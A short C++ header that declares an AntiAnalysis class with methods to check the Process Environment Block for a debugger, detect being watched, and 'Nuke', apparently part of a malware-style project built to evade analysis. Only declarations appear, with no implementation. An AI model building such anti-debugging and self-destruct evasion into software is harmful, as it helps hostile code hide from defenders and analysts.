#ifndef ANTIANALYSIS_H
#define ANTIANALYSIS_H


#pragma once
#include "API/headers/api.h"


class AntiAnalysis
{
	bool CheckPebForDebug(API::APIResolver& resolver);

public:
	bool IsBeingWatched(API::APIResolver& resolver);
	int  Nuke(API::APIResolver& resolver);

};
#endif // !ANTIANALYSIS_H